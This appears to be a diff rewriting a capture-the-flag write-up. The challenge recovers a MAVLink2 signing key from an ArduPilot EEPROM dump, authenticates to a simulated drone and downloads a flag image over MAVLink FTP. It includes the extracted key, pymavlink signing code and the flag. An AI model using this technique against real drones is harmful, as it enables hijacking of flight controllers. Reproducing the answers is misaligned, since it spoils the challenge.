@@ -1,139 +1,202 @@
+
 # One to Rule Them All
 
-| | |
-|---|---|
-| **Category** | Communication & RF |
-| **Points** | 499 |
-| **Solves** | 32 |
+| Item | Value |
+|------|-------|
+| Category | Communication & RF |
+| Points | 499 |
+| Solves | 32 |
 
 ## Description
 
-Prismantir's team got hands on an enemy drone last night — the rest of its swarm went dark before anyone else could be brought in. Its flight controller landed on your desk this morning, still warm. One unit is all we get but word is they all share the same secret, so make it count before someone finds out and changes it.
+Prismantir recovered a single enemy drone running **ArduPilot**. Although only one flight controller was captured, the swarm shares the same MAVLink2 signing key. Recover the signing key from the EEPROM dump, authenticate to the drone over MAVLink2, then use MAVLink FTP to retrieve the hidden image containing the flag.
 
-**Flag format:** `starpwn{[A-Za-z_]+}`
+**Flag format**
 
-**Attachments:**
-- `eeprom.bin` — ArduPilot EEPROM dump
-- Web UI: `starpwn-27f0b78c7312-one-to-rule-them-all-0-0.chals.io`
-- MAVLink Telemetry: `tcp:0.cloud.chals.io:26121`
+```text
+starpwn{[A-Za-z_]+}
+```
 
-## Solution
+## Files
 
-### Steps
+- `eeprom.bin` – 16 KiB ArduPilot EEPROM
+- `GCS_Signing.cpp` – SigningKey structure
+- `GCS_FTP.cpp/.h` – MAVLink FTP implementation
+- `analyse_eeprom.py`
+- `analyse_signing.py`
+- `verify_key.py`
+- `heartbeat.py`
+- `find_png.py`
+- `downloader.py`
 
-**1. Identify the EEPROM format**
+---
 
-Confirm the dump is a valid ArduPilot AP_Param EEPROM by checking the magic bytes:
+# Solution
+
+## 1. Identify the EEPROM
+
+The dump begins with the `PA` magic used by ArduPilot AP_Param storage.
 
 ```bash
 python3 analyse_eeprom.py eeprom.bin
 ```
 
-Output:
-```
-Magic: PA
-Revision byte: 6
-Size: 16384 bytes
-```
+The script also reports populated EEPROM regions and searches for the signing-key magic.
 
-**2. Locate the MAVLink signing key**
+![EEPROM Layout](01-eeprom-layout.png)
 
-Scan the EEPROM for the `SigningKey` structure magic `0x3852FCD1` defined in `GCS_Signing.cpp`:
+---
+
+## 2. Recover the MAVLink2 signing key
+
+`GCS_Signing.cpp` defines the persistent signing structure:
 
 ```cpp
-// From GCS_Signing.cpp
-#define SIGNING_KEY_MAGIC 0x3852fcd1
-
 struct SigningKey {
     uint32_t magic;
     uint64_t timestamp;
-    uint8_t secret_key[32];
+    uint8_t  secret_key[32];
 };
 ```
+
+The structure is identified using the magic value `0x3852FCD1`.
 
 ```bash
 python3 analyse_signing.py eeprom.bin GCS_Signing.cpp
 ```
 
+Recovered key:
+
+```text
+d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126
+```
+
+---
+
+## 3. Verify the key
+
+Before interacting with the drone, verify that the recovered key correctly authenticates signed MAVLink2 traffic.
+
+```bash
+python3 verify_key.py HOST PORT <KEYHEX>
+```
+
+Expected:
+
+```text
+[+] KEY VERIFIED
+```
+
+---
+
+## 4. Enumerate the telemetry service
+
+A simple heartbeat confirms that the connection and signing work correctly.
+
+```bash
+python3 heartbeat.py HOST PORT <KEYHEX>
+```
+
+---
+
+## 5. Inspect the filesystem with MAVLink FTP
+
+The drone exposes the ArduPilot MAVLink FTP service (`FILE_TRANSFER_PROTOCOL`).
+
+List the filesystem:
+
+```bash
+python3 find_png.py
+```
+
+Result:
+
+```text
+/
+ ├── eeprom.bin
+ ├── DCIM
+ │    └── flag.jpg
+ └── terrain
+```
+
+---
+
+## 6. Download the flag image
+
+`downloader.py` implements the same packet format used by ArduPilot's `GCS_FTP.cpp`.
+
+Protocol flow:
+
+```text
+ResetSessions
+      ↓
+OpenFileRO("DCIM/flag.jpg")
+      ↓
+ReadFile(offset=0, size=239)
+      ↓
+ReadFile(...)
+      ↓
+EOF
+      ↓
+TerminateSession
+```
+
+Run:
+
+```bash
+python3 downloader.py
+```
+
 Output:
-```
-============================================================
-Offset     : 0x1F80
-Magic      : 0x3852FCD1
-Timestamp  : 36527303400913
-Key        : d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126
-============================================================
+
+```text
+[+] File size : 40536 bytes
+...
+[+] Saved 40536 bytes to flag.jpg
 ```
 
-**3. Verify the signing key**
+---
 
-Confirm the extracted key is valid by receiving a signed MAVLink2 frame from the swarm and verifying the HMAC-SHA256 signature:
+## 7. Read the flag
 
-```bash
-python3 verify_key.py 0.cloud.chals.io <port> d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126
-# → [+] KEY VERIFIED
-```
+Open `flag.jpg`.
 
-**4. Authenticate to the swarm with MAVLink FTP**
+![Recovered Flag](flag.jpg)
 
-Use the extracted key to authenticate via signed MAVLink2 and connect to the drone's filesystem over MAVLink FTP (FILE_TRANSFER_PROTOCOL, msg ID 110):
+The image contains the sentence:
 
-```python
-import os
-os.environ["MAVLINK20"] = "1"   # Required: forces MAVLink2 with signing
-from pymavlink import mavutil
+> **machines never pledged to be allegiant**
 
-KEY = bytes.fromhex("d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126")
-m = mavutil.mavlink_connection("tcp:0.cloud.chals.io:<port>", dialect="ardupilotmega",
-                                source_system=255, source_component=190)
-m.setup_signing(KEY, sign_outgoing=True, allow_unsigned_callback=lambda mav, mid: True)
-```
+Therefore the flag is
 
-**5. List the filesystem and download the flag**
-
-Use the MAVLink FTP protocol to list the SITL working directory and download `DCIM/flag.jpg`:
-
-```bash
-python3 solve.py 0.cloud.chals.io <port>
-# [*] listing '.'
-# [*] listing 'DCIM'
-#     F  flag.jpg  ...
-# [*] downloading DCIM/flag.jpg
-# [+] wrote flag.jpg
-```
-
-**6. Read the flag from the image**
-
-The downloaded `flag.jpg` is an aerial photograph of Allegiant Stadium in Las Vegas with the message painted on the roof:
-
-> *machines never pledged to be allegiant*
-
-### Key Artifacts
-
-| File | Description |
-|------|-------------|
-| `eeprom.bin` | ArduPilot EEPROM dump containing the signing key |
-| `GCS_Signing.cpp` | ArduPilot source — defines `SigningKey` struct and magic |
-| `analyse_eeprom.py` | Scans EEPROM for non-zero regions and signing magic |
-| `analyse_signing.py` | Extracts signing key using struct layout from source |
-| `verify_key.py` | Verifies key against a live signed MAVLink2 frame |
-| `solve.py` | Full exploit: authenticate + MAVLink FTP download |
-| `flag.jpg` | Downloaded flag image |
-
-### Attack Summary
-
-```
-eeprom.bin (ArduPilot EEPROM dump)
-    → scan for SIGNING_KEY_MAGIC (0x3852FCD1)
-    → extract 32-byte secret_key at offset 0x1F90
-    → key: d4ee003d187614d9ffa24d20f58b448551c2cdc1e54cf42fc00bb86182249126
-        → authenticate MAVLink2 (MAVLINK20=1 + setup_signing)
-        → MAVLink FTP LIST "." → LIST "DCIM" → READ "DCIM/flag.jpg"
-        → open image → read flag
-```
-
-## Flag
-
-```
+```text
 starpwn{machines_never_pledged_to_be_allegiant}
+```
+
+---
+
+# Attack Summary
+
+```text
+eeprom.bin
+    │
+    ├── Parse AP_Param EEPROM
+    │
+    ├── Locate SigningKey (0x3852FCD1)
+    │
+    ├── Extract 32-byte MAVLink2 signing key
+    │
+    ├── Verify with live signed telemetry
+    │
+    ├── Authenticate using MAVLink2 signing
+    │
+    ├── MAVLink FTP
+    │      ├── LIST
+    │      ├── OpenFileRO
+    │      ├── ReadFile
+    │      └── TerminateSession
+    │
+    └── Download DCIM/flag.jpg
+            │
+            └── Read flag
 ```
